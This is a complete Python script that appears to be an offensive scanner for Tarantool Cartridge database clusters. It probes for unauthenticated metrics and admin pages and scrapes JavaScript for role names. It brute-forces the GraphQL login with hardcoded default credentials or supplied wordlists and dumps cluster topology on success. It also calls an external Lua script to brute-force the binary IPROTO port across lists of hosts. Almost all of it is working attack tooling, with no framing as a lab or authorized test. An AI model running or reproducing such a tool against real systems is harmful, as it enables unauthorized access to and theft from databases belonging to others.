#!/usr/bin/env python3
import argparse
import requests
import urllib3
import json
import os
import re
import subprocess
import tempfile

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

CARTRIDGE_PORTS = [8080, 8091, 8092, 8190]
DEFAULT_HTTP_CREDENTIALS = [("admin","admin"),("admin","secret"),("admin","password"),("tarantool","tarantool"),("root","root"),("admin",""),("admin","admin123"),("admin","tarantool")]
INFO_ENDPOINTS = ["/metrics","/metrics/prometheus","/health","/swagger","/api/swagger.json"]
ADMIN_PATHS = ["/admin/cluster/","/admin/cluster/dashboard","/admin/cluster/topology"]
GRAPHQL_CHECK_PAYLOAD = {"query":"{ servers { uri status } }"}

def load_lines_from_file(file_path):
    if not file_path or not os.path.exists(file_path): return []
    with open(file_path,"r",encoding="utf-8",errors="ignore") as f:
        return [line.strip() for line in f if line.strip() and not line.startswith("#")]

def check_info_leak(base_url):
    findings = []
    for path in INFO_ENDPOINTS:
        url = f"{base_url}{path}"
        try:
            res = requests.get(url, timeout=4, verify=False, allow_redirects=False)
            if res.status_code == 200 and len(res.text)>0 and any(x in res.text for x in ["tnt_","prometheus","status","swagger"]):
                findings.append(f"[!!!] DATA LEAK: {url} accessible without auth, data: {res.text.strip()[:120]}...")
        except: continue
    return findings

def check_admin_paths_smart(base_url, login_page_len):
    findings = []
    for path in ADMIN_PATHS:
        url = f"{base_url}{path}"
        try:
            res = requests.get(url, timeout=4, verify=False, allow_redirects=False)
            res_len = len(res.text)
            if res.status_code == 200 and res_len != login_page_len:
                html_lower = res.text.lower()
                if "login" not in html_lower and ("cartridge" in html_lower or "cluster" in html_lower or res_len>500):
                    findings.append(f"[!!!] BYPASS: {url} returned {res_len} bytes without login page")
        except: continue
    return findings

def extract_secrets_from_js(base_url, html_content):
    findings = []
    js_srcs = re.findall(r'src=["\']([^"\']+\.js)["\']', html_content)
    found_keywords = set()
    for js_path in js_srcs:
        if js_path.startswith("/"): js_url = f"{base_url}{js_path}"
        else: js_url = f"{base_url}/admin/{js_path}" if "admin" not in js_path else f"{base_url}/{js_path}"
        try:
            js_res = requests.get(js_url, timeout=5, verify=False)
            if js_res.status_code == 200:
                roles = re.findall(r'["\']([\w\-_\.]+role[\w\-_\.]*)["\']', js_res.text)
                for r in roles:
                    if len(r)<30: found_keywords.add(r)
        except: continue
    if found_keywords:
        findings.append(f"[+] Keywords/roles found in JS: {list(found_keywords)[:10]}")
    return findings

def brute_force_graphql(api_url, credentials_list):
    for username, password in credentials_list:
        login_mutation = {"query": f'mutation {{ login(username: "{username}", password: "{password}") }}'}
        try:
            session = requests.Session()
            res = session.post(api_url, json=login_mutation, timeout=4, verify=False)
            if res.status_code == 200:
                resp_json = res.json()
                if "errors" not in resp_json and resp_json.get("data",{}).get("login") is True:
                    confirm = session.post(api_url, json=GRAPHQL_CHECK_PAYLOAD, timeout=4, verify=False)
                    if confirm.status_code == 200 and "data" in confirm.json():
                        return (username, password, confirm.json()['data'])
                    return (username, password, None)
        except: continue
    return None

def scan_http(host, port, credentials_list, use_https=False):
    protocol = "https" if use_https else "http"
    base_url = f"{protocol}://{host}:{port}"
    admin_url = f"{base_url}/admin"
    api_url = f"{base_url}/api/graphql"
    findings = []
    try:
        res = requests.get(admin_url, timeout=8, verify=False, allow_redirects=True)
        html_lower = res.text.lower()
        login_page_len = len(res.text)
        if not ("cartridge" in html_lower or "tarantool" in html_lower or "root-cluster" in html_lower):
            return None
        findings.append(f"[!] Tarantool Cartridge panel detected (HTTP {res.status_code}, {login_page_len} bytes)")
        findings.extend(check_info_leak(base_url))
        findings.extend(check_admin_paths_smart(base_url, login_page_len))
        findings.extend(extract_secrets_from_js(base_url, res.text))
        try:
            api_res = requests.post(api_url, json=GRAPHQL_CHECK_PAYLOAD, timeout=5, verify=False)
            if api_res.status_code == 200 and "data" in api_res.json() and api_res.json()["data"] is not None:
                findings.append("[!!!] CRITICAL: GraphQL API fully accessible without auth (bypass)!")
                return findings
            else:
                findings.append("[*] GraphQL API protected, requires session")
        except: pass
        findings.append(f"[*] Brute-forcing GraphQL with {len(credentials_list)} credential pairs...")
        creds = brute_force_graphql(api_url, credentials_list)
        if creds:
            user, pwd, data = creds
            findings.append(f"[+++] SUCCESS: Valid credentials {user}:{pwd}")
            if data:
                findings.append(f"      Cluster topology: {json.dumps(data)[:120]}...")
        else:
            findings.append("[-] No valid credentials found in supplied list")
        return findings
    except Exception:
        return None

def scan_iprotocol_via_lua(host, port, username, password_list):
    default_passwords = ["admin","tarantool","password","secret","root","admin123","qwe123_tnt","tnt_admin"]
    pass_file = None
    if password_list != default_passwords and password_list:
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as f:
            for pwd in password_list:
                f.write(pwd + '\n')
            pass_file = f.name

    script_dir = os.path.dirname(os.path.abspath(__file__))
    lua_script = os.path.join(script_dir, "script.lua")
    
    cmd = ["tarantool", lua_script, "-i", f"{host}:{port}"]
    if username != "admin":
        cmd.extend(["-u", username])
    if pass_file:
        cmd.extend(["-p", pass_file])
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        if result.returncode != 0:
            err_msg = result.stderr.strip()
            return [f"[-] lua  error (code {result.returncode}): {err_msg[:300]}"]
        
        output = result.stdout
        findings = []
        in_report = False
        
        for line in output.split('\n'):
            if "[+] РЕЗУЛЬТАТ ДЛЯ" in line:
                in_report = True
                continue
            if in_report and (line.startswith("========================================") or line.strip() == ""):
                break
            if in_report:
                cleaned = line.strip()
                if cleaned:
                    findings.append(cleaned)
        
        if not findings:
            if output.strip():
                findings = ["[!] Raw lua output:", output[:800]]
            else:
                findings = ["[-] No output from lua "]
        
        if pass_file:
            os.unlink(pass_file)
        return findings
    except Exception as e:
        if pass_file and os.path.exists(pass_file):
            os.unlink(pass_file)
        return [f"[-] Exception running lua : {e}"]

def print_report(host, port, service, findings):
    print(f"\n{'='*60}")
    print(f" REPORT FOR {host}:{port} [{service.upper()}]")
    print(f"{'='*60}")
    for line in findings:
        print(f"  {line}")
    print()

def main():
    parser = argparse.ArgumentParser(description="Unified Tarantool  (HTTP + IPROTO via lua)")
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument("-i", "--ip", help="Single IP address")
    target_group.add_argument("-I", "--ip-file", help="File with list of IPs")
    parser.add_argument("-p", "--ports", nargs="+", type=int, default=CARTRIDGE_PORTS + [3301],
                        help="Ports to scan (default: 8080,8091,8092,8190,3301)")
    parser.add_argument("--http-user-file", help="File with usernames for HTTP GraphQL brute")
    parser.add_argument("--http-pass-file", help="File with passwords for HTTP brute")
    parser.add_argument("--iproto-user", default="admin", help="Username for IPROTO brute (default: admin)")
    parser.add_argument("--iproto-pass-file", help="File with passwords for IPROTO brute")
    args = parser.parse_args()

    http_creds = []
    if args.http_user_file or args.http_pass_file:
        users = load_lines_from_file(args.http_user_file) if args.http_user_file else ["admin"]
        passwords = load_lines_from_file(args.http_pass_file) if args.http_pass_file else [""]
        for u in users:
            for p in passwords:
                http_creds.append((u, p))
    else:
        http_creds = DEFAULT_HTTP_CREDENTIALS

    iproto_passwords = ["admin","tarantool","password","secret","root","admin123","qwe123_tnt","tnt_admin"]
    if args.iproto_pass_file:
        iproto_passwords = load_lines_from_file(args.iproto_pass_file)

    hosts = [args.ip] if args.ip else load_lines_from_file(args.ip_file)

    for host in hosts:
        print(f"\n######## Scanning {host} ########")
        for port in args.ports:
            if port in CARTRIDGE_PORTS:
                findings = scan_http(host, port, http_creds, use_https=False) or scan_http(host, port, http_creds, use_https=True)
                if findings:
                    print_report(host, port, "HTTP Cartridge", findings)
                else:
                    print(f"[*] No Cartridge panel detected on {host}:{port} (HTTP/HTTPS)")
            elif port == 3301:
                findings = scan_iprotocol_via_lua(host, port, args.iproto_user, iproto_passwords)
                if findings:
                    print_report(host, port, "Binary IPROTO (via lua)", findings)
                else:
                    print(f"[-] Failed to scan {host}:{port} with lua")
            else:
                findings = scan_http(host, port, http_creds, use_https=False) or scan_http(host, port, http_creds, use_https=True)
                if findings:
                    print_report(host, port, "HTTP", findings)
                else:
                    findings = scan_iprotocol_via_lua(host, port, args.iproto_user, iproto_passwords)
                    if findings:
                        print_report(host, port, "Binary IPROTO (via lua)", findings)
                    else:
                        print(f"[*] No service detected on {host}:{port}")

if __name__ == "__main__":
    main()
